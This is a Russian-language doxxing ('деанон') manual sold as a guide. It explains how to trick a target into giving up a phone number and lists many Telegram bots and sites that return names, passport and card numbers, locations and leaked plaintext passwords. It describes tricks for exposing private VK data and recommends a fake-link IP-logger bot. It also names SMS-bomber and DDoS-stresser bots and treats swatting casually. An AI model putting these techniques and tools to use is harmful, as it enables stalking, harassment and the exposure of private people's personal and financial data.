Второй способ:Пишем ему и говорим,привет давай я у тебя что-то куплю или скину просто денег,дай свой киви,Сбер номер, Тинькофф номер.Если у него киви то в большинстве случаев он даст ник Qiwi.Но а мы не тупые и говорим,у меня Сбер могу только по номеру дай пожалуйста номер.
И он даёт номер,скачиваем из Play Market приложение 'Get Contact' вводим его номер и проверяем.



Ещё пару ботов и консультация по деанону.
https://t.me/QuickOSINT_bot
https://t.me/GetOK2bot
https://t.me/useridinfobot
https://t.me/getfb_bot
https://t.me/nforst_search_sova_bot
https://t.me/PasswordSearchBot
https://t.me/n3fm4xw2rwbot
https://t.me/t_sys_bot платная имба
https://t.me/TempMailBot временная почта
https://t.me/OSINTInfoRobot имбулька без доступа
https://t.me/helper_inform_bot помощник
https://t.me/cerber_robot
https://t.me/SEARCHUA_bot
https://t.me/BlackatSearchBot
https://t.me/AngelSearchBot 
https://t.me/Informator_BelBot
https://t.me/QSearch1_Bot спит
https://t.me/vimebasebot норм
https://t.me/pyth1a_0racle_bot
https://t.me/phone_avito_bot
https://t.me/asffsasffbot
https://t.me/detectiva_robot
https://t.me/PhoneLeaks_bot
https://t.me/mnp_bot
https://t.me/kolibri_osint_bot
https://t.me/noblackAuto_bot
https://t.me/getcontact_real_bot
https://t.me/maigret_osint_bot
https://t.me/vk2017robot
https://t.me/clerkinfobot
https://t.me/CarPlatesUkraineBot
https://t.me/siteshot_bot
https://t.me/telesint_bot
https://t.me/iptools_robot
https://t.me/pwIPbot
https://t.me/usinfobot
https://t.me/AgentFNS_bot
https://t.me/SovaAppBot
https://t.me/oomanuals_bot
https://t.me/dadatacheckbot
https://t.me/ShtrafKZBot
https://t.me/ip_score_checker_bot
https://t.me/VipiskaEGRNbot
https://t.me/ogrn_bot
https://t.me/Search_firm_bot
https://t.me/bmi_np_bot

Консультация
Давайте вместе научимся базавому деанону.
+79859993368 вот пример номер.
Заходим в бота @EyeOfAllah_bot
Вводим номер:Итог получаем область и оператора.Москва Московская область.Оператор МТС.
@BlackatSearchBot вводим номер: Итог баланс сим карты, аккаунт Ватсапп,фото.

Скачиваем приложение Get Contact вводим номер:ФИО
Этого нам хватает.
Далее лишь нам надо будет вводить данные в боты и собирать данные.
Вот ещё вам боты тут лишь ваше желание работать,и учится деанону.

Как же узнать по номеру телефона профиль ВКонтакте.
Добавляем номер себе в контакты, заходим в официальное приложение ВКонтакте,заходим в чаты и нам либо предложат ему написать или он будет в верхней строке пользователей,либо у него нету ВК.

Боты:
@Smart_SearchBot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.
@Getcontact_Officalbot – показывает как номер телефона записан в контактах других людей
@info_baza_bot – база данных номеров телефона, email
@get_caller_bot - Ищет только по номеру телефона. На выходе: ФИО, дата рождения, почта и «ВКонтакте»
@OpenDataUABot – по коду ЕДРПОУ возвращает данные о компании из реестра, по ФИО — наличие регистрации ФОП
@YouControlBot - полное досье на каждую компанию Украины
@mailseatchbot - По запросу пробива e-mail выдает открытый пароль от ящика если тот есть в базе
@Dosie_Bot – создатели «Досье» пошли дальше и по номеру телефона отдают ИНН и номер паспорта
@UAfindbot – База данных Украины
NNB - @The_NoNameBot (дает полезную инфу) 


https://eyeofgod.space/ (Актуальный глаз бога искать здесь, ибо его вечно банят) 


@EmailPhoneOSINT_bot - Получаем ФИ, почту, регион 


@phone_avito_bot - проверяем авито акич


@getcontact_real_bot - работу гет контакта, знаете


@usinfobot - получаем тг айди 


@TgAnalyst_bot - если акич попал в бд телеграмма, выдаст айпи, номер, девайс


@UniversalSearchBot - по мануалу который даст бот после пробива по номеру, узнаете вк аву


LBSG.net, Collection 1, StockX.com, 8Tracks.com, Wishbone.io, DailyQuiz.me, Zynga.com, Wattpad.com


databases.today — архив баз банков, сайтов, приложений


@basetelega — утечки, компании, парсинг открытых источников


ebaza.pro (r) — есть email, телефонные номера, физ. лица, предприятия, базы доменов и другие


hub.opengovdata.ru — Российские базы статистики, росстата, архивы сайтов, финансы, индикаторы, федеральные органы власти, суды и т.д


@freedomf0x — утечки сайтов, приложений, гос. структур
@leaks_db — агрегатор публичных утечек
@BreachedData — утечки сайтов, приложений, соц. сетей, форумов и т.д.
@opendataleaks — дампы сайтов школ, судов, институтов, форумов по всему миру
@fuckeddb — дампы сайтов, приложений, социальных сетей, школ, судов, институтов, государственных ресурсов, форумов по всему миру
@gzdata — китайские сайты и приложения 


AVinfoBot (r) – делает отчет где есть данные из социальных сетей, недвижимости, автомобилей, объявлений и телефонных книжек. Нужно пригласить другой аккаунт для отчета
getcontact.com (r) — выдает информацию о том как записан номер в контактах
truecaller.com (r) — телефонная книга, ищет имя и оператора телефона
avinfo.guru (r) — проверка телефона владельца авто, иногда нужен VPN
spravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес
m.ok.ru — показывает часть номера телефона, email, фамилии и полностью город с датой регистрации, используй во вкладке инкогнито
smartsearchbot.com — бот находит ФИО, email, объявления, бесплатный поиск не доступен для новых пользователей
list-org.com — найдет организацию в РФ
odyssey-search.info (r) — сыщит ФИО, объявления Avito, автомобили, документы, места работы, контакты, а при регистрации можно указать любую российскую организацию
find-org.com — найдет компанию в РФ


@FindClonesBot – Поиск человека по фото
@MsisdnInfoBot - Получение сведений о номере телефона
@AVinfoBot - Поиск сведений об автовладельце России
@antiparkon_bot - Поиск сведений об автовладельце
@friendsfindbot - Поиск человека по местоположению
@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта России
@last4mailbot (Mail2Phone) — по почте показывает статус: есть ли аккаунт в «Одноклассниках» и «Сбербанке», или нет.
@bmi_np_bot - По номеру телефона определяет регион и оператора.
@whoisdombot - пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.
@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность 



Чтобы научится деанону нужно лишь ваше желания и читать запоминать.Спасибо за покупку мануала!


(Деанон - это когда кто-то раскрывает твою настоящую личность или информацию о тебе в Интернете, что позволяет другим людям узнать, кто ты на самом деле.)

(Доксинг - это когда кто-то собирает и раскрывает твою личную информацию в Интернете, например, твое имя, адрес, номер телефона и т.д. с целью нападения на тебя или публичного осуждения.)

(Мануал - это документ, который содержит инструкции или руководство по выполнению каких-либо задач. Он может быть написан на разных языках и иметь различный вид, от простых листов бумаги до объемных книг или электронных файлов. Мануалы помогают людям понимать, как правильно использовать какое-либо устройство или выполнять определенные задачи, уменьшая возможность ошибок и улучшая качество работы.)


----------------------------------------------------


НАЧИНАЕМ

@o12yuzom3_bot_bot
Дефолт,глаз бога. Бот как вы знаете пробивает по многим данным,имеет огромное количество баз данных,но проктически все его покупают из за телеграма,так как там пиздец ваще тема,они даже платили 2₽ за одного контакта,ну кнч же у них база будет ебейшая,400₽ месяц.


@Qu11ck_osi111nt_bot
Квик осинт, пиздатый для меня бот,подписка стоит +- 600-650₽ на месяц,но для меня стоит. Пробивает так же по телеграм аккаунту не плохо,бывает что выдает очень много информации за раз,так что советую.

@Angel_SearchBot

Архангел. Ахуенный бот прям,к сожалению тут запросы,на месяц и тд тут нету. Но все равно ахуенный бот для пробивов,если даже чуть дорогой.

@Zernerda_bot

Зернерда. Тоже пиздатый бот, использую его повседневно, выдает не плохо так информации,и подписка дешевая. Советую для начинающих.

@TheAlexUsersBox_bot

Юзербокс. Ахуенный просто бот,я его обожаю просто, выдает пиздец топовую инофрмацию,иногда бывает то что выдает ту где нигде нету. Пиздец огромный функционал. Подписка не дорогая.

@TheAlexGta_bot

Гта бот. Не плохой бой для пробивов,даже сказал бы очень даже очень хороший бот. Имеет ахуенный функционал,огромное количество баз данных,и многок другое.

@VKHistoryRobot

Вкхистори. Ахуенный бот для чека истории аккаунта,чекает как выглядел аккаунт 1-10 лет назад,ваще кайфово. Можно найти старые фотографии и т.д.


@GetOK2bot (Одноклассники, находит профиль по номеру)

@poiskorcombot(Пиздатый бот тоже по многим данным пробивакт ваще имба)

@cybersecdata_bot(Полностью бесплатный бот ахуенный тоже но чуть запутано но поху,иногда может не работать а так кайфово)

@bmi_np_bot(определяет оператор и ищет ещё че либо. такое се но пойдет)

@ip_score_checker_bot (Чекер IP / думаю лучший бот)

@UsersSearchBot (один из лучших пиздато пробивает первый кто зайдет тип который впервые нажмет старт получит 7 д подписку бесплатную)

@safe_search_bot (дата лик не плохой бот тоже пробивает ахуенно,но с подпиской пиздато ещё,но и без подписки не плохо так инофрмации выдает скажу я вам)

@SovaAppBot (бля ребзя не могу описать бота пиздатый бот много чего находит чекните сами пж один из лучших ботов)

@PhoneLeaks_bot (тоже ахуенный чекает в каких утечках был найден номер)

@Detecta_bot (ебать пиздатый соц сети ахуенно находит и другие данные ваще шик)

@search_himera_bot (пиздец какой дорогой но шикарный)

@TeleSkan_bot (топовый смотрит в каких группах был найден телеграм аккаунт)

@helper_inform_bot (БЛЯ ЕБЕЙШИЙ находит ахуенную инфу прям все шикарно расписывает и все шик)

@BlackatSearchBot (топовый тоже не плохо так пробивает по различным данным не плохо так показывает 90% баланс симкарты и тд многок другое кайф крч)

@test_sys_tank_bot (дорогой нахуй но пиздатый бля скажу честно пизда)

@FakeSMI_bot (крч кидаешь боту ссылку делает фейк ссылку и кидает те,после того кидаешь долбаебу он заходит и его айпишник у тебя и пробиваешь через айпи логгер и все авхенно,но хуй точный адрес найдешьдх тк с айпи невозможно)

@eyeofbeholder_bot (сами чекнете потом пиздатый просто бот мне лень описывать че тут)

@pyth1a_0racle_bot (БЛЯЯЯ ЕБЕЙШИЙ БОТ ищет историю там покупок и тд в яндексе ваще кайфовый даже иногда выдает геолокацию)

@TgAnalyst_bot (пиздатый просто выдает номер по тегу ахуенный,но не вселда выдает не забывайте)

@getcontact_real_bot (обыч гетконтакт не плохой)

@UniversalSearchRobot (бля ахуенный бот но платный а так ебейший функционал бля просто имба тупа)

@telesint_bot (тож не плохой просто ищет группы по тегу кайф)

@ce_poshuk_bot (ахуенный бот просто для украины вообще пиздатый ну там и так в основном украина)

@infobazaa_bot (бля пашет давно ахуенный просто бот бля всем пиздец как советую но платный но зато пиздатый)

ребят ща дам дополнительную инфу и факты


сразу скажу факт что деф не всегда помогает но иногда решает то что у кого ты покупал его

бля пж не ведитесь на долбаебов которые нихуя о вас не знают и скажут что сватнут вас просто пошлите их нахуй и киньте в чс они вам репу портить будут

денег нету на покупки что либо - к сожалению не многого добьешься братанчик

всегда будь уверенным в себе даже если ты сватнут там не парься так и так все пройдёт даже уже всем похуц на сват но есть которые попадаются как долбаебы которые через свою основную почту сватают АЭАЭАЭАЭАЭАХАХАХААХАХХАХАХАХАХАХАЗАЗАЗАЗА

так же скажу последствия свата что твои гаджеты менты будут проверять в течении 3 месяца каждую ределю будешь идти как долбаеб и гаджеты на проверку тупо сдавать лучше не заниматься хуйней

постарайтесь максимально не злоупотреблять этим пж последствия возможео плохие будут

покупайте не виртуальные а физические номерв их дохуище в продаже помогает не плохо так тк они пустыми бывают

лучше полностью чекайте себя во всех базах постарайтесь максимально быть анонимным чтобы пизды не получить

не пишите мне в лс " с чего начать " и тд просто начинайте подбирать для ся пиздатых ботов и все ищите че угодно,но вам бабки понадобятся братишки

так же тут вам скину разные сервисы и разные боты для пробивов

кста те которые я сверху показать я их в основном использую,иногда сам чекаю по базе или по сервисам


90+ Ботов для пробивов 


1.@phonenumberinformation_bot
2. @Quick_osintik_bot
3. @UniversalSearchRobot
4. @search_himera_bot
5. @Solaris_Search_Bot
6. @Zernerda_bot
7. @t_sys_bot
8. @OSINTInfoRobot
9. @LBSE_bot
10. @SovaAppBot
11. @poiskorcombot
12. @SEARCHUA_bot
13. @helper_inform_bot
14. @infobazaa_bot
15. @declassified_bot
16. @GHack_search_bot
17. @osint_databot
18. @Informator_BelBot
19. @HowToFindRU_Robot
20. @SEARCH2UA_bot
21. @UsersSearchBot
22. @BITCOlN_BOT
23. @ce_poshuk_bot
24. @BlackatSearchBot
25. @dataisbot
26. @n3fm4xw2rwbot
27. @cybersecdata_bot
28. @safe_search_bot
29. @getcontact_real_bot
30. @PhoneLeaks_bot
31. @useridinfobot 
32. @mailcat_s_bot
33. @last4mailbot
34. @holehe_s_bot
35. @bmi_np_bot
36. @clerkinfobot
37. @kolibri_osint_bot
38. @getcontact_premium_bot
39. @phone_avito_bot
40. @pyth1a_0racle_bot
41. @olx_phone_bot
42. @ap_pars_bot
43. @SPOwnerBot
44. @regdatebot
45. @ibhldr_bot
46. @TgAnalyst_bot
47. @cryptoscanning_bot
48. @LinkCreatorBot
49. @telesint_bot
50. @Checknumb_bot
51. @TelpoiskBot_bot
52. @TgDeanonymizer_bot
53. @protestchat_bot
54. @locatortlrm_bot
55. @GetCont_bot
56. @usinfobot
57. @SangMataInfo_bot
58. @creationdatebot
59. @tgscanrobot
60. @InfoVkUser_bot
61. @getfb_bot
62. @GetOK2bot
63. @VKHistoryRobot
64. @detectiva_robot
65. @FindNameVk_bot
66. @vk2017robot
67. @AgentFNS_bot
68. @OpenDataUABot
69. @egrul_bot
70. @Bumz639bot
71. @ogrn_bot
72. @ShtrafKZBot
73. @egrnrobot
74. @VipiskaEGRNbot
75. @Search_firm_bot
76. @geomacbot
77. @pwIPbot
78. @ipscorebot
79. @ip_score_checker_bot
80. @FakeSMI_bot
81. @ipinfo_check_bot
82. @Search_IPbot
83. @WhoisDomBot
84. @vimebasebot
85. @maigret_osint_bot
86. @PasswordSearchBot
87. @ddg_stresser_bot
88. @BotAvinfo_bot
89. @reverseSearch2Bot
90. @pimeyesbot
91. @findfacerobot
92. @CarPlatesUkraineBot
93. @nomerogrambot
94. @ShtrafyPDRbot
95. @cerbersearch_bot


пжж чекните каждый


вот вам сервисы

ИСТОЧНИКИ ДЛЯ ПРОВЕРКИ ГРАЖДАН РОССИИ

Международный розыск:
└ https://www.interpol.int/notice/search/wanted

Список теppористов:
└ http://fedsfm.ru/documents/terrorists-catalog-portal-act

Федеральный розыск:
└ https://mvd.ru/wanted

Розыск сбежавших заключенных:
└ http://fsin.su/criminal/

Розыск ФССП:
└ http://fssprus.ru/iss/ip_search

Действительность паспорта:
└ http://сервисы.гувм.мвд.рф/info-service.htm?sid=2000

Проверка ИНН:
└ https://service.nalog.ru/inn.do

Кредиты:
└ https://app.exbico.ru/

Исполнительные производства:
└ http://fssprus.ru/iss/ip

Налоговые задолженности:
└ https://peney.net/

Залоги имущества:
└ https://www.reestr-zalogov.ru/state/index#

Банкротство:
└ https://bankrot.fedresurs.ru/

Участие в судопроизводстве:
└ https://bsr.sudrf.ru/bigs/portal.html

Решения мировых судей СПб:
└ https://mirsud.spb.ru/

Участие в бизнесе:
└ https://zachestnyibiznes.ru/
└ https://ogrn.site/

Поиск в соцсетях:
└ https://yandex.ru/people
└ https://pipl.com

ща еще будет


Сервисы для проверки BIN кредитных карт:

binbase.com (2 запроса в день если нет аккаунта)
binlist.net (общая информация по карте)
binlist.io (тож самое что и сверху ток оформление другое)
freebinchecker.com (хуйня)
bincheck.org (общая информация по карте)
binchecker.com (я заебался вводить капчу)
bincheck.io (хороший сайт, общие сведения о карте)

ща еще

СЕРВИСЫ ДЛЯ ПОИСКА🔎 :

NickName
<------------------------------------------------>
https://namechk.com
https://knowem.com
https://www.namecheckr.com
http://usersherlock.com
https://usersearch.org
https://thatsthem.com
https://inteltechniques.com/menu.html
<------------------------------------------------>
People
<------------------------------------------------>
http://people.yandex.ru
https://vk.com/people
https://www.facebook.com/friends/requests/
https://twitter.com/search-advanced
http://pipl.com
https://www.spokeo.com/
https://scholar.google.ru/
https://yandex.ru/people
<------------------------------------------------>
Photo
<------------------------------------------------>
@face_detect_bot
https://findmevk.com/
https://images.google.com/
https://yandex.ru/images/
https://www.tineye.com/
https://vlicco.ru/
http://searchface.ru/
https://findface.pro/ru/
<------------------------------------------------>
Exif
<------------------------------------------------>
http://metapicz.com/#landing
http://linkstore.ru/exif/
http://exif.regex.info/exif.cgi
http://imgops.com/
<------------------------------------------------>
Number
<------------------------------------------------>
@get_kontakt_bot
http://nomerorg.me
http://spra.vkaru.net
https://phonenumber.to
http://doska-org.ru/
Приложение "GetContact"
Приложение "NumBuster"
Приложение "Truecaller"
Приложение "Skype"
<------------------------------------------------>
Auto
<------------------------------------------------>
https://avinfo.co/
https://гибдд.рф/check/auto

ща еще будетт

3 Сервиса по пробиву данных

https://numbuster.com/ru/ - первый сайт для поиска информации о владельце телефона, работает как и со странами СНГ, так и с США и другими. 

https://pipl.com/ - Второй сайт для поиска человека по номеру телефона, никнейму, почте или имени.

https://scholar.google.ru/ - С помощью данного сайта можно найти все связи человека с наукой.

Ищем данные человека по электронной почте!

OSINT —  поиск информации о человеке или организации по базам данных, которые доступны всем;

▪️haveibeenpwned —  Сервис, который проводит проверку почты в слитых базах. 
▫️ emailrep — Сайт найдет на каких сервисах был зарегистрирован аккаунт, использующий определенную почту.
▪️ intelx —  Многофункциональный поисковик, поиск осуществляется еще и по даркнету.
▪️ mostwantedhf — Данный сервис ищет аккаунт Skype.

авхенно ща еще будет



📎 Поиск человека по аккаунту ВКонтакте:
searchlikes.ru • tutnaidut.com • 220vk.com • vk5.city4me.com • vk.watch • vk-photo.xyz • vk-express.ru • archive.org • yasiv.com • archive.is • yzad.ru • vkdia.com

📎 Поиск человека по Twitter аккаунту:
followerwonk.com • sleepingtime.org • foller.me • socialbearing.com • keyhole.co • analytics.mentionmapp.com • burrrd.com • keitharm.me • archive.org • undelete.news

📎 Поиск человека по Facebook аккаунту:
graph.tips • whopostedwhat.com • lookup-id.com • keyhole.co • archive.org

📎 Поиск человека по Instagram аккаунту:
gramfly.com • storiesig.com • codeofaninja.com • sometag.org • keyhole.co • archive.org • undelete.news

📎 Поиск человека по Reddit аккаунту:
snoopsnoo.com • redditinsight.com • redditinvestigator.com • archive.org • redditcommentsearch.com

📎 Поиск человека по Skype
mostwantedhf.info • cyber-hub.pw • webresolver.nl



многие не знают,как отличить виртуальный номер от настоящего.

Для этого нам поможет сервис:

https://m.smsc.ru/testhlr/

осуществляет проверку номера HLR-запросом и выдает информацию о номере ахуенно крч

https://data.intelx.io/saverudata/#/?n= 

авхенный черканите как будет время


анонимность:

никогда не делитесь своец настоящец информацией просто всегда говорите одно и тоже, никогда не делитесь своими номерами и тд,будь всегда уверенным как я говорил уже минуту назад но пох

бля ебать ошибок много ну лан поху крч

старайтесь максимально быть анонимным,ни в коем случае не переходите по каким то странным ссылкам который скинет вам бичара 

ищите находите ошибки в себе, у каждая анонимностб разная

И ДА ВСЕГДА СОБИРАЙТЕ ИНОФРМАЦИЮ И ЧИТАЙТК ВНИМАТЕЛЬНО КАКУЮ ИНФОРМАЦИЮ ВАМ ВЫДАЛ БОТ А НЕ ПРОПУСКАЙТЕ ХУЙНЮ,НИКАКАЯ ИНФА НЕ МОЖКТ БЫТЬ ЛИШНЕЙ,ОНА ВАМ МОЖЕТ ОЧЕНЬ СИЛЬНО ПОНАДОБИТСЯ НО ВОЗМОЖНО ВЫ ДАЖЕ НЕ ЗАМЕТИТЕ ЕЁ 

тут кнч не все боты но все равно ребят,тут их дохуя просто 


1. Всегда смотри внимательно на то, что тебе в гугле выходит при запросе. Порой даже мелочь может быть решением. 
2. Не думай, что деанонимизация представляет из себя что-то сверх умное и сложное. Каждый деанон строится на ошибках самого человека, ведь сли бы он сам не создал канал, ничего может и не было. 
3. Не советую тебе заниматься деанонами, если кто-то знает о тебе что-либо. Ты должен быть защищен, чтобы в случае чего ты сам не стал жертвой. 
4. К каждому человеку свой подход. На кого то уходит по 2-3 дня, кто-то деанонится за 5-10 минут
Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х
1. Несколько полезных сайтов.
[!] Содержимое раздела:

• https://checkusernames.com/ - Поиск по никнеймам, в него входят огромное колл-во сайтов.
• https://online-vk.ru/ - Покажет скрытых друзей, так же, покажет вам друзей из закрытого профиля.
• https://220vk.com/ - Сайт, который сможет показать скрытых друзей и не только.
• https://findclone.ru/ - Поиск по "клонам", определяет внешность человека, тем самым выдает страницу ВКонтакте на пользователя с максимально похожими чертами лица.
• Keyword Tool (https://keywordtool.io/)
Платформа показывает ключевые слова по введенному запросу на любом языке и по любой стране. В некоторых запросах даже видно, насколько они популярны, хотя эта услуга платная. Можно искать ключевые слова по Google, YouTube, Twitter, Instagram, Amazon, eBay, Play Store, Bing.
Ища по Google, можно, например, выбрать ключевые выражения, содержащие в себе вопросительные слова или предлоги. А слева есть фильтры, где можно искать по ключевым словам уже в получившейся выдаче.
• https://vk.com/tool42 - Приложение ВК, можно достать немного информации.
• https://www.kody.su/check-tel#text - На данной странице можно определить сотового оператора и регион (или город и страну) по любому номеру телефона в России или в мире.
• https://vk.watch/ - история профилей ВКонтакте, требуется подписка.
Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х

2. Телефон
L Поиск по номеру телефона
[!] Содержимое раздела:

• Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб
версия поиска по любому номеру телефона, поиск по аккаунтам и телефонной книге - от себя: полезная вещь в osint-сфере, не раз спасала меня.
• Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах - от себя: Сайт хороший, но я думаю, что бот в телеграмме будет на много удобнее для Вас.
• Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона - от себя: Вещь годная, но долго возиться
• Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона - Иногда нужен VPN
• @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
• Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
• @info_baza_bot (https://t.me/@info_baza_bot) — поиск в базе данных
• @find_caller_bot (https://t.me/@find_caller_bot) — найдет ФИО владельца номера телефона
• @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
• @getbank_bot (https://t.me/@getbank_bot) — дает номер карты и полное ФИО клиента банка
• @eyegodsbot - Телеграмм бот, часто радовал меня, есть бесплатные пробивы по машинам, лицу, номеру телефона, есть платный контент.
• @egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта; учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы. Базы данных сами понимаете откуда. Ограничений бота – нет.
• @mnp_bot 
• @xinitbot 
• @black_triangle_tg 
Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х
3. Лицо
L Поиск лицу
[!] Содержимое раздела:

• FindTwin face search demo + @VkUrlBot (бот подобие сайта)— https://findclone.ru/
• Face search • PimEyes — https://pimeyes.com/en/
• Betaface free online demo — Face recognition, Face search, Face analysis — http://betaface.com/demo_old.html
• VK.watch – история профилей ВКонтакте — https://vk.watch/

Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х

4. Поисковые системы
L Поисковые Cистемы Людей:
[!] Содержимое раздела:

• https://www.peekyou.com/
• https://pipl.com/
• https://thatsthem.com/
• https://hunter.io/
• https://www.beenverified.com/

Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х
5. Ip-адрес.
L Проверка айпи адресов:
[!] Содержимое раздела:

• https://whatismyipaddress.com/
• http://www.ipaddresslocation.org/
• https://lookup.icann.org/
• https://www.hashemian.com/whoami/

Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х-Х

Поиск по EMAIL:
- https://haveibeenpwned.com/
- https://hacked-emails.com/
- https://ghostproject.fr/
- https://weleakinfo.com/
- https://pipl.com/
- https://leakedsource.ru/

▫️ 🤖Боты
├ @Quick_OSINT_bot — позволяет проводить анализ профиля, покажет историю собщений пользователя, выгрузит его фотографии, а еще найдет телефон, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое
├ @FindNameVk_bot — история изменений имени аккаунта
├ @GetPhone_bot — поиск в утекших базах
├ @InfoVkUser_bot — бот покажет наиболее частые места учебы друзей аккаунта
└ @VKUserInfo_bot — бот скачивает всю информацию об аккаунте

⚙️ Ресурсы
├ 220vk.com (https://220vk.com/) — определит средний возраст друзей, скрытых друзей, города друзей, дата регистрации и т.д
├ archive.is (https://archive.is/) — архивированная страница аккаунта
├ archive.org — покажет архивированную версию аккаунта
├ searchlikes.ru (https://searchlikes.ru/) — найдет где есть лайки и комментарии, дает статистику друзей
├ tutnaidut.com (https://tutnaidut.com/) — информация аккаунта несколько лет назад
├ vk.watch (https://vk.watch/) — покажет историю аккаунта с 2016 года, ограниченная информация, покажет фото в низком качестве, можно уменьшить масштаб фото, тем самым распознать что там изображено
├ vk5.city4me.com (https://vk5.city4me.com/) — cтатистика онлайн активности, скрытые друзья
├ vkdia.com (https://vkdia.com/) — определит с кем из друзей переписывается человек
├ vk-express.ru (https://vk-express.ru/) — слежка за аккаунтом, после добавления будут доступны аватары, лайки, комментарии, друзья группы и т.д.
├ vk-photo.xyz (https://vk-photo.xyz/) — частные фото аккаунта
├ yasiv.com (http://yasiv.com/vk) — создает граф из друзей аккаунта, после регистрации добавьте в граф аккаунт того кого хотите просмотреть
└ yzad.ru (https://yzad.ru/) — находит владельца группы

🔧 Приложения
├ InfoApp (https://vk.com/app7183114) — найдет созданные группы, упоминания в комментариях, созданные приложения и комментарии к фото
└ VKAnalysis (https://github.com/migalin/VKAnalysis) — анализ круга общения, текста, фото, онлайна и интересов аккаунта

⚙️ Поиск через URL
├ https://online-vk.ru/pivatfriends.php?id=123456789 — поиск друзей закрытого аккаунта, замените 123456789 на ID аккаунта VK
├ https://vk.com/feed?obj=123456789&q=&section=mentions — упоминания аккаунта, замените 123456789 на ID аккаунта VK
├ https://ruprofile.pro/vk_user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK
├ https://rusfinder.pro/vk/user/id123456789 — сохраненная информация об аккаунте за 2017-18 год, замените 123456789 на ID аккаунта VK
└ https://my.mail.ru/vk/123456789 — найдет аккаунт на Мой Мир, замените 123456789 в ссылке на ID аккаунта



🆗 Как узнать номер телефона аккаунта VK через Одноклассники

1. В ВК добавьте аккаунт в друзья
2. Перейдите в Одноклассники и откройте раздел мои друзья
3. Нажмите на кнопку 'добавить друзей из ВК'
4. Если аккаунт нашелся, то скопируйте ссылку на найденный аккаунт ОК
5. Перейдите по ссылке - https://ok.ru/password/recovery и выберите восстановить через профиль
6. Вставьте в поле ссылку которую вы скопировали на профиль и нажмите искать

В результате вы получите часть номера телефона и e-mail адреса



👨‍👩‍👦 Как найти друзей приватного аккаунта VK

1. Скопируйте ID аккаунта у которого хотите узнать друзей
2. Откройте Google, и вставьте туда этот ID, например: id123456
3. В результатах поиска откройте такие сайты как facestrana.ru или boberbook.ru или vkanketa.ru или vkglobal.ru или другой который похож на эти
4. На сайте будет анкета другого человека(это один из друзей), скопируйте ID этого аккаунта(ID в пункте основная информация)
5. Перейдите по ссылке 220vk.com - https://220vk.com/commonFriends
6. В первом поле вставьте ID друга, а во втором ID приватного аккаунта
7. Нажмите кнопку "искать общих друзей"

Если друзей не нашлось или их мало, воспользуйтесь ID другого друга из результатов поиска в Google


😎 Как найти владельца сообщества VK

Через приложение
└ Откройте VKinfo(https://vk.com/app7183114) и впишите ссылку на сообщество

Через сайт
└ Откройте http://yzad.ru и дайте ссылку на паблик

Через документы
1. Откройте раздел документы в сообществе
2. Откройте исходный код страницы (Ctrl+U)
3. Откройте окно поиска(Ctrl+F)
4. В окне поиска введите имя файла которое есть в сообществе. В результатах должна быть строка с именем файла, пример:
[["439837850","xls","OkiDoki.xls","806 КБ, 01 октбр 2020 в 17:59","-27921417",0,"","138633190",false,1,""]]
где OkiDoki.xls имя файла, а 138633190 ID пользователя загрузившего этот файл, как правило это ID админа


🎂 Как узнать скрытый возраст владельца аккаунта VK

└ Установите расширение для браузера VKopt скачав здесь - https://vkopt.net/download/


Дополнения:


====================================================================================================================================================
https://t.me/HowToFind - помогает найти информацию по известным данным. Очень мощная штука. 
https://t.me/InstaBot - скачивает фото, видео, аватарки, истории из Instagram 
https://t.me/VKUserInfo_bot - Удобный способ спарсить открытую информацию аккаунта ВК по id 
https://t.me/InfoVkUser_bot - позволяет провести анализ друзей профиля и выдает город + ВУЗ 
https://t.me/Smart_SearchBot - поиск информации по номеру телефона 
https://t.me/egrul_bot - сведения о государственной регистрации юрлиц и ИП 
https://t.me/buzzim_alerts_bot - бот для мониторинга открытых каналов и групп в Telegram 
https://t.me/callcoinbot - звонилка
https://t.me/TempGMailBot - выдает временный адрес [домен: ....gmail.com] 
https://t.me/DropmailBot - выдает временный адрес [домен: ....laste.ml] 
https://t.me/fakemailbot - выдает временный адрес [домен: ....hi2.in] 
https://t.me/etlgr_bot - временые адреса c возможностью повторного использования и отправки сообщений.
https://t.me/remindmemegabot - хорошая напоминалка 
https://t.me/MoneyPieBot - поможет не забыть о ваших долгах 
https://t.me/SmsBomberTelegram_bot
https://t.me/SmsB0mber_bot
https://t.me/smsbomberfreebot
https://t.me/flibustafreebookbot - библиотека книг (флибуста, https://flibusta.appspot.com/) 
https://t.me/Instasave_bot - скачивает видео из Instagram. Бот справляется всего за несколько секунд — достаточно отправить ссылку, и он скачивает файл самостоятельно. 
https://t.me/red_cross_bot - бот накладывает красный крест на любое изображение, отправленное ему. 
https://t.me/vk_bot - бот, позволяющий настроить интеграцию с VKontakte. 
